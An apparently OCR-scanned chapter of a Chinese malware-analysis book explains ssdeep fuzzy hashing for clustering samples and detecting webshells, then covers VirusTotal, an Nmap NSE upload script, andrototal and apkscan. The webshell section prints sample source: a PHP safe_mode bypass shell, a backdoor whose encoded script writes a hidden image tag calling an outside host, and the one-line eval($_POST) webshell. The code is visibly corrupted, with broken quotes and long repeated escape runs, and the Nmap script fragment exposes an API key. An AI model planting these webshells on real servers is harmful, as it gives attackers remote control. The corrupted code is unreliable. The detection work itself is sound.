ssdeep是Fuzzy散列（或CTPH（context triggered piecewise hashes））工具。既可以通过散列值检查文件完整性，也可以检查与源文件的相似度。它不会使用整个文件的散列值（MD5、SHA1等）进行区分，而是把文件分割成几块，并对每块赋予散列值。因此，即使其中一块稍微有些改动，散列值也会不同。

可以在以下网站下载安装或解压后使用ssdeep。

http://ssdeep.sourceforge.net/

Windows二进制文件 SHA256 dc4350b6d0190d8149ac53454d9ffd458b08a8cd69b2c841c62700254c1916c7
源代码 SHA256 5b893b8059941476352fa1794c2839b2cc13bc2a09e2f2bb6dea4184217beddc

下面用ssdeep散列值生成一个样本文件。浏览生成的文件时可以看到，包含“ssdeep,1.-blocksize:hash:hash,filename”头。因此，只有散列值显示“invalid file header:”警告信息，而且不进行比较。然后把生成的散列值与收集到的1万个样本文件进行比较。最末端括号里的数字是匹配分数，这个分数越接近100，则说明相似度越高。

这个分数默认设置为0，所以会显示大于0的数字。可以使用 $ -t $选项设置输出值。如果显示结果过多，就需要调整分数。

root@remnux:/opt/malware/unsorted/PE32# ssdeep
abb07bd209f77d9718873c170f714d80 > hash.txt
root@remnux:/opt/malware/unsorted/PE32# cat hash.txt
ssdeep,1.1--blocksize:hash:hash,filename
6144:XcNYS996KFifeVjBpeExgVTFSXFoMc5RhCaL37f:XcW7KEZlPzCy37,"/opt/malware/unsorted/PE32/abb07bd209f77d9718873c170f714d80"
root@remnux:/opt/malware/unsorted/PE32# ssdeep -m hash.txt *
/opt/malware/unsorted/PE32/033cf05440feedfaa8c2c399c70cab6a matches
hash.txt:/opt/malware/unsorted/PE32/abb07bd209f77d9718873c170f714d80 (94)
/opt/malware/unsorted/PE32/09e2e66043414057ee818009c8e88e1e matches

hash.txt: /opt/malware/unsorted/PE32/abb07bd209f77d9718873c170f714d80 (97)
/opt/malware/unsorted/PE32/2729099fda8a4d8124facbb3c71fc852 matches
hash.txt: /opt/malware/unsorted/PE32/abb07bd209f77d9718873c170f714d80 (88)
/opt/malware/unsorted/PE32/3aa8619417d66036a17f6678cc05b0ad matches
hash.txt: /opt/malware/unsorted/PE32/abb07bd209f77d9718873c170f714d80 (72)
/opt/malware/unsorted/PE32/3c64a7ae2f232befa0202b581aaaf569 matches
hash.txt: /opt/malware/unsorted/PE32/abb07bd209f77d9718873c170f714d80 (94)
/opt/malware/unsorted/PE32/4db0cefef0191f5d26abb690585081f8 matches
hash.txt: /opt/malware/unsorted/PE32/abb07bd209f77d9718873c170f714d80 (94)
/opt/malware/unsorted/PE32/5a49f016174727a5e5bae639d7742753 matches
hash.txt: /opt/malware/unsorted/PE32/abb07bd209f77d9718873c170f714d80 (91)
/opt/malware/unsorted/PE32/726f89f82de7945c5bffa553bbda7122 matches
hash.txt: /opt/malware/unsorted/PE32/abb07bd209f77d9718873c170f714d80 (93)
/opt/malware/unsorted/PE32/75d5c9a95099a1e29be3cc161c87ea08 matches
hash.txt: /opt/malware/unsorted/PE32/abb07bd209f77d9718873c170f714d80 (94)
/opt/malware/unsorted/PE32/8440805abda84fedf9f2bd90815458b3 matches
hash.txt: /opt/malware/unsorted/PE32/abb07bd209f77d9718873c170f714d80 (96)
/opt/malware/unsorted/PE32/86548cad017680e19bfab559fe21bce3 matches
hash.txt: /opt/malware/unsorted/PE32/abb07bd209f77d9718873c170f714d80 (97)
/opt/malware/unsorted/PE32/97245783753db31626921f0c781c4670 matches
hash.txt: /opt/malware/unsorted/PE32/abb07bd209f77d9718873c170f714d80 (94)
/opt/malware/unsorted/PE32/9f0b570ca9b63084bb2e470db79eb3d9 matches
hash.txt: /opt/malware/unsorted/PE32/abb07bd209f77d9718873c170f714d80 (96)
/opt/malware/unsorted/PE32/abb07bd209f77d9718873c170f714d80 matches
hash.txt: /opt/malware/unsorted/PE32/abb07bd209f77d9718873c170f714d80 (100)
/opt/malware/unsorted/PE32/c10ff62d04d6962bb62226c538b99b0b matches
hash.txt: /opt/malware/unsorted/PE32/abb07bd209f77d9718873c170f714d80 (80)
/opt/malware/unsorted/PE32/c15ff91d7248cb67ac5eed063138139c matches
hash.txt: /opt/malware/unsorted/PE32/abb07bd209f77d9718873c170f714d80 (96)
/opt/malware/unsorted/PE32/d54e5707ec2f69ae63c8c66d06eade42 matches
hash.txt: /opt/malware/unsorted/PE32/abb07bd209f77d9718873c170f714d80 (72)
/opt/malware/unsorted/PE32/d76ac74867d533b1f7570aa381967907 matches
hash.txt: /opt/malware/unsorted/PE32/abb07bd209f77d9718873c170f714d80 (97)
/opt/malware/unsorted/PE32/e7b73ce97bfba7fb0f034b73f418c95d matches
hash.txt: /opt/malware/unsorted/PE32/abb07bd209f77d9718873c170f714d80 (96)

如果需要比较的文件很多，就会耗费很长时间，此时会很想确认是否正常工作运行。可以使用-a选项显示所有信息。通过ssdeep对收集到的多个恶意代码和分析后的恶意代码进行关联，以掌握类似代码的特性。

root@remnux:/opt/malware/unsorted/PE32# ssdeep -m card_hash.txt * -a
/opt/malware/unsorted/PE32/0004f7cb8c202138f537dee23cd8754a matches
card_hash.txt:/root/ozjy._exe (0)
/opt/malware/unsorted/PE32/000bb03f6e9440a5df740bfb9311b069 matches
card_hash.txt:/root/ozjy._exe (0)
/opt/malware/unsorted/PE32/000d6b3f8961b474813a3e9f9644f286 matches
card_hash.txt:/root/ozjy._exe (0)
/opt/malware/unsorted/PE32/000d88bb2fe2e5b5d65f7367ec3a397f matches
card_hash.txt:/root/ozjy._exe (0)
/opt/malware/unsorted/PE32/0010478e7f4ffdd33def4b9f83b6ae3d matches
card_hash.txt:/root/ozjy._exe (0)

   </div>

/opt/malware/unsorted/PE32/001581bda521795dfb31ffe3ed789ef5 matches
card_hash.txt:/root/ozjy._exe (0)
/opt/malware/unsorted/PE32/0016bdd3771721cc77a50a4c07efd1e5 matches
card_hash.txt:/root/ozjy._exe (0)
/opt/malware/unsorted/PE32/0016efb79aa493c78e41730dbf5ad85b matches
card_hash.txt:/root/ozjy._exe (0)
/opt/malware/unsorted/PE32/0032b231898fdd0ac4094d5166bee787 matches
card_hash.txt:/root/ozjy._exe (0)
/opt/malware/unsorted/PE32/00362d4d385ca37319da9884282d9a75 matches
card_hash.txt:/root/ozjy._exe (0)

下列示例展现了将ssdeep与安全软件进行关联后的使用情况。为了探测出利用论坛漏洞上传的WebShell程序，导入WebShell探测解决方案。之前已经讲解了ssdeep的概念，所以下面介绍使用Fuzzy散列探测WebShell的方案。

收集100多个WebShell程序作为样本后，检测各文件相似度。以ssdeep散列值为基准，有两个文件的相似度分数是38分。这个结果虽然不能帮我们百分百确定是WebShell，但因为WebShell只要有特定字符串就可以正常执行，所以即使仅有一点相似也需要怀疑相关文件。

... (中略) ...
webshell\529.txt webshell\529.php (100)
webshell\529.txt webshell\529.txt (100)
webshell\529.txt webshell\php_backdoor.txt (38)
webshell\Ajax_PHP_Command_Shell.php webshell\Ajax_PHP_Command_Shell.php (100)
webshell\Ajax_PHP_Command_Shell.php webshell\Ajax_PHP_Command_Shell.txt (100)
webshell\Ajax_PHP_Command_Shell.php webshell\soldierofallah.txt (58)
... (省略) ...

比较两个文件后发现，包含重要攻击信息的Unescape部分相同。即使只包含这么少的字符也能检测相似度，这也随之提高了WebShell探测的准确度。

# 529.txt源代码

<?php
/*
safe_mode and open_basedir Bypass PHP 5.2.9
KingDefacer ARCH?VES /

This Exploit Was Edited By KingDefacer
NOTE:

*/
if(!empty($_GET['file%（））$file=$_GET['file‘」;
else if(!empty($_POST['file（」）) $file=$_POST['file'」;
echo <PRE><P>This is exploit from <a
href="/title="Securityhouse">Security House - Shell Center - Edited By
KingDefacer</a> labs.
Turkish H4CK3RZ
<p><b> [Turkish Security Network] - Edited By KingDefacer
<p>PHP 5.2.9 safe_mode & open_basedir bypass

<p>More: <a href="/">Md5Cracking.Com Crew</a>
<p><form name="form"
action="http://'.$_SERVER["HTTP_HOST"].htmlspecialchars($_SERVER["SCRIPT_NAME"])
.$_SERVER["PHP_SELF"].' " method="post"><input type="text" name="file" size="50"
value="'.htmlspecialchars($file).'"><input
type="submit"
name="hardstylez" value="Show"></form>;
...（中略）...
curl_close($ch);
?>
bypass shell:
<script
type="text/javascript">document.write('u003c\u0069\u006d\u0067\u0020\u0073\u0077\u0063\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u0060\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069

#### php_backdoor.txt文件源代码

<!-- http://michaeldaw.org 2006 -->
<script
type="text/javascript">document.write('u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0022\u0068\u0074\u0071\u0072\u003a\u002f\u002f\u0061\u006c\u0074\u0075\u0072\u006b\u0073\u002e\u0063\u006f\u006d\u002f\u0073\u006e\u0066\u002f\u0073\u002e\u0070\u0068\u0070\u0022\u0020\u0077\u0069\u0064\u0074\u0068\u003d\u0022\u0031\u0022\u0020\u0068\u0065\u0069\u0067\u0068\u0074\u003d\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u0022\u0031\u002

 </div>

“一句话木马”（一行WebShell）从2009年开始投入使用，最近形成了很多修改后的攻击，具有如下模式。只检查eval()函数时会出现很多误报，所以使用ssdeep判断是否检测。

<?php @eval($_POST[c]) ?>

 </div>

为了生成Fuzzy散列值而执行如下命令时，字符串太短会导致错误。ssdeep从4097字节开始才能生成正确的散列值。

C:\APM_Setup\htdocs>ssdeep 1line_base.php
ssdeep,1.1--blocksize:hash:hash,filename
48:iVsdZI0kK3CgXlHednVsdZI0kK3CgXlHedqVsdZI0kKMSdZIn:iVsShhVsShQVsMR, "C:\APM_Setup\htdocs\1line_base.php"
ssdeep: Did not process files large enough to produce meaningful results
C:\APM_Setup\htdocs>ssdeep 1line_base.php
ssdeep,1.1--blocksize:hash:hash,filename
48:iVsdZI0kK3CgXlHednVsdZI0kK3CgXlHedqVsdZI0kKMSdZIR:iVsShhVsShQVsM3, "C:\APM_Setup\htdocs\1line_base.php"

由此可知，很难对 “一句话木马” 应用Fuzzy散列。但是可以对代码进行编码，增加代码就应该可以应用Fuzzy散列了。

C:\APM_Setup\htdocs&gt;ssdeep 1line.php
ssdeep,1.1--blocksize:hash:hash,filename
3:kIx5Be:kIx58, "C:\APM_Setup\htdocs\1line.php"
ssdeep: Did not process files large enough to produce meaningful results

 </div>

VirusTotal服务不仅可以分析恶意代码，也可以分析扩展名为pcap的网络数据包文件。使用比较受欢迎的网络探测系统Snort和Suricata的探测模式整理详细内容，可以连接现有的探测系统判断数据包里的PDF、SWF、EXE等可疑文件。

 </div>

图4-13列出了HTTP和DNS的详细请求信息。

 </div>

点击 “探测系统信息” 后能看到被探测模式的详细信息。从示例中可以看到，包含了恶意代码常用的 “黑洞”（Blackhole）相关信息。

 </div>

VirusTotal服务提供了可以安装在台式机上使用的客户端版本。点击“Documentation”Desktop Application”菜单下载并安装相应程序。

 </div>

如图4-16所示，安装完成后，用鼠标右键点击需要诊断的App。选择“发送到 > VirusTotal”会自动把文件发送到VirusTotal网站并显示分析结果，如图4-17所示。这个应用程序不仅可以诊断移动设备上的恶意App，还可以安装在所有用户的PC上随时搜索可疑文件。

 </div>

 </div>

#### OO 使用Nmap NSE分析恶意代码

Nmap是渗透测试（Penetration Testing）信息收集（Information Gathering）阶段最常用的端口扫描软件，但诊断者和管理者都想要收集更多信息。虽然可以使用Nmap选项，但选项的增多会要求更多时间，而且影响用户体验。为了解决此问题，Nmap NSE（NSE，Nmap Scripting Engine）应运而生，从Nmap 4.2版本开始应用。NSE是Nmap最强的工具，也是最具扩展性的工具。它可以收集NFS、SMB、RPC等详细信息，也可以执行域名lookup、Whois搜索、检查其他网段服务器是否安装后门、漏洞检测等多项工作。

此处只介绍使用VirusTotal网站API功能的脚本。

##### http://nmap.org/nsedoc/scripts/http-virus total.html

很多在线服务会使用沙箱（Sandbox）功能对可疑文件进行动态或静态分析。http-virustotal.nse会使用VirusTotal网站（www.virustotal.com）提供的API密钥比较恶意代码的散列值，并在命令行窗口中显示各杀毒软件的探测结果。

注册网站账号后，点击右上角的ID显示个人信息，在该页面点击API Key标签即可。

图4-18 查看VirusTotal的API密钥信息

下面使用http-virustotal.nse制作自动化工具。收集恶意代码样本后，把所有文件发送到VirusTotal，接收Report值后统计。如果不存在就会出现错误，所以很容易区分。每个结果都会使用“散列值.xml”形式保存。下方的search("android_malware")文件夹包含了我收集到的多个恶意代码样本。

import os.path

import time

next = os.path.join(dirname, f)

os.system('nmap --script=http-virustotal --script-args="apikey=

'3d374ec8f2bfa4063cd1728eb8d8f8e4b2a9c8ce36b06a0a73d3044e1373e688'',upload=true",filename="'+dirname+'"/","'+f+'"">

search("android_malware"

执行脚本后浏览生成的文本文件，可以看到各恶意代码的报告链接信息。复制地址后使用浏览器访问，可以看到如图4-19所示的画面。

Starting Nmap 6.01 (http://nmap.org) at 2013-06-16 19:41 EDT

Pre-scan script results:

| http-virustotal:

Your file was successfully uploaded and placed in the scanning queue.

To check the current status visit:

https://www.virustotal.com/file/632e3c9be2bc616bf2ca2908194cf8f5cf8bbdcf865262f0bbce59380e5c0466/analysis/1371426116/

Nman done: 0.

不访问网站也可以直接使用脚本在命令行窗口管理报告，所以可以用于分析并统计多个恶意代码。

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>SHA256:</td><td colspan="2">01b49fed999c4c998b0c18b632d02001eea00f24557a346ea59dfc18e15c6b9</td></tr></table>

图4-19 在VirusTotal网站查看Android恶意代码分析结果

#### 4.1.3 使用VirusTotal App进行诊断

VirusTotal不仅发布了可以分析本地PC可疑文件的程序，还发布了可以诊断Android系统软件的VirusTotal移动设备App。

下载地址如下：

https://www.virustotal.com/en/documentation/mobile-applications/

可以从Google App Store下载安装。首次上传到Google App Store的时间是2012年6月13日。

 </div>

安装后运行程序就会自动开始工作。收集安装的apk文件后，会和注册在VirusTotal网站上的散列值进行比较。如果默认安装的App比较多，分析的时间也会相应变长。

 </div>

结果会按照用户程序（User Apps）和系统程序（System Apps）分类显示。如果VirusTotal上有之前检验过的报告（Report），就会使用安全（绿色）和可疑（红色）显示。如果之前没有被检验过，则会显示问号“?”。使用相关文件在VirusTotal上检测1次即可获取报告。

点击生成结果的App时会显示详细信息。图4-22右侧画面中的“Scan Results”标签会根据不同杀毒软件厂商显示简要的判断结果。“Detailed results”标签会把各杀毒软件的分析结果显示到同一页面。

 </div>

不能完全相信结果并删除可疑文件。但如果大部分杀毒软件都将之判定为病毒，最好还是删除文件以确保安全。最近出现了很多恶意软件，所以要尽可能使用诊断程序保护个人设备。

 </div>

#### 4.1.4 使用 andrototal 诊断

andrototal $ ^{①} $在线分析网站有点像VirusTotal网站，连名称也相似。andrototal会综合显示静态分析结果和杀毒软件检测出的结果。此网站的优点是关联了很多Android恶意代码分析中需要的功能，所以能获取多种信息。如图4-24所示，左侧是最后分析的apk文件信息（散列信息）和结果链接（Full analysis），右侧根据杀毒软件的种类和版本进行了分类。

 </div>

因为图4-24左侧菜单中包含了没有被判定为恶意代码的程序，所以如果是为了掌握恶意代码的形态，那么此服务有点不适用。在图4-24右侧菜单中点击并搜索各杀毒软件。打开页面后，以最近的搜索日期排列，使用绿色“NO threat detected”显示正常文件。如果是恶意代码，则使用红色显示恶意代码的类型名称。

 </div>

转到下一页面会看到历史数据库中分析次数最多的前10个恶意代码，如图4-26所示。

 </div>

现在重新回到前一页面，点击“详细报告”（Full Report）按钮，如图4-27所示。

 </div>

此报告只能查看杀毒软件截获的画面和LogCat导出文件、各时间段的使用情况，可视为简要总结页面。如果想浏览样本的详细内容，可以点击md5散列信息旁的小文档图标，如图4-28所示。

 </div>

现在查看详细的报告。默认包含了散列信息，可以看到此恶意代码属于哪个类型。因为各杀毒软件的分类名称不同，所以会被分成多个种类。

 </div>

这个网站的优点在于可以连接外部服务以获取更多信息，这就是“外部分析信息”（External analysis）。其他服务已经都介绍过，所以略过，先讲解“ForeSafe”。“ForeSafe”也提供移动设备恶意代码分析服务，可以进行静态/动态分析。此服务的好处是，可以使用模拟器分阶段查看分析过程中的画面，类似于DroidBox提供的功能。

 </div>

(出处：http://foresafe.com/report/29B01135074E5243CBC6B1FF22C2B8E2)

我个人喜欢的另一个功能是针对权限进行安全等级标准测试, 并说明各权限可运行功能的部分。仅查看这些权限信息也能判断出恶意代码会执行哪些功能, 是很好的参考资料。

 </div>

andrototal服务介绍到此结束，其他信息请各位亲自点击查看。

#### 4.1.5 使用apkscan App进行诊断

本节要介绍的apkscan服务也会使用VirusTotal网站、Safe Browsing API和Droid动态工具。如果认真学习过之前的内容，那应该不会对这些单词感到陌生。

© www.stuckincustoms.com

☀️g☀️☀️△☀️🌸☀️g☀☀️☀️,π⁄₁

##### Warning: Something's Not Right Here!

www.stuckincustoms.com contains content from newportalse.com, a site known to distribute malware. Your computer might catch a virus if you visit this site.

Google has found malicious software may be installed onto your computer if you proceed. If you've visited this site in the past or you't trust this site, it's possible that it has just recently been compromised by a hacker. You should not proceed, and perhaps try again tomorrow or go somewhere else.

We have already notified newportalse.com that we found malware on the site. For more about the problems found on newportalse.com, visit the Google Safe Browsing diagnostic page.

If you understand that visiting this site may harm your computer,  $ \underline{\text{proceed anyway}} $.

Help improve detection of malware by sending additional data to Google about sites on which you see this warning. This data will be handled in accordance with the Safe Browsing privacy policies.

图4-32 Chrome确认是否为恶意代码

如果想获取Google Safe Browsing个人API密钥，需先登录谷歌网站访问如下页面，同意条款后就会收到API密钥。

http://ccode.google.com/apis/safebrowsing/key_signup.html

service and when displaying each warning about a particular site, you will provide attribution and conspicuous notice that the reliability and accuracy of the service cannot be guaranteed, using language similar to that found at

http://code.google.com/apis/safebrowsing/developers_guide_v2.html#User

Warnings.

2. If your API Client also shows warnings about sites that do not appear on the list provided by Google, you may not include the Google attribution in those warnings.

3. You may not treat a URL from Google's list as a suspected phishing or malware site, such as by showing users a warning about the site or blocking access to it, unless your application has received from Google updated information (via the applicable API method) within the past thirty minutes.

图4-33 查看谷歌API密钥

之后可以访问http://sb.google.com/safebrowsing/api signup查看API密钥

 </div>

测试时可以访问http://apkscan.nviso.be网站，将文件拖拽到页面，点击下方的“Scan package”按钮即可进行简单的分析。

 </div>

在页面下端可以看到分析进度，点击黄色底纹页面可以浏览报告和技术信息。

   </div>

 </div>

 </div>

访问http://apkscan.nviso.be/report/overview查看之前分析的所有报告。点击链接后可以看到样本的详细报告。在最右边的“Risk rating”查看是否为恶意代码，此处以VirusTotal为判断标准。因此，即使是恶意代码，如果VirusTotal上注册的杀毒软件没有探测出来，就会出现失误。

 </div>

简单浏览详细报告的各项时，会在顶端看到包含apk文件散列值的信息。以后搜索相同散列值时，就会显示此报告。

 </div>

另外还有manifest文件包含的权限信息，由于包含了apk文件的API权限和版本等信息，所以

可以大致判断是否为恶意代码。向内存媒体赋予了写权限，还有查看Wi-Fi信息的部分，以及向查看CPU状态的部分赋予了权限。授权模式包括近期移动恶意代码中的WRITE_EXTERNAL_STORAGE、ACCESS_WIFI_STATE、WAKE_LOCK等。

 </div>

搜索并显示源代码中的URL信息, 然后通过Google Safe Browsing查看是否被注册为恶意使用域名。

 </div>

图4-42的图表结果表示动态分析时使用DroidBox包含的功能对App运行时间进行比较，然后掌握的服务开始时间、文件打开/写入时间等信息。

 </div>

下面比较我上传的结果与其他沙箱服务。与Anubis导出的结果相比，详细分析的质量还略有欠缺。但是在线服务各有优劣，可以根据自己的需求选择使用。

apkscan: http://apkscan.nviso.be/report/show/2d6ff3b040feb910f34175cf7ac1ca0b

(短链接：http://goo.gl/LjXnzW)

Anubis: https://anubis.iseclab.org/?action=result&task_id=1df1536c0ca95fdc4b55abae303a1c207&format=html

(短链接：http://goo.gl/2jdoHk)

#### 4.1.6 使用Dexter进行诊断

Dexter $ ^{①} $会自动对apk文件进行静态分析，然后使用可跟踪形态显示类、方法、权限等信息，并使用图形方式显示连接状态。使用服务前需要注册账号，以项目为单位进行管理。

 </div>

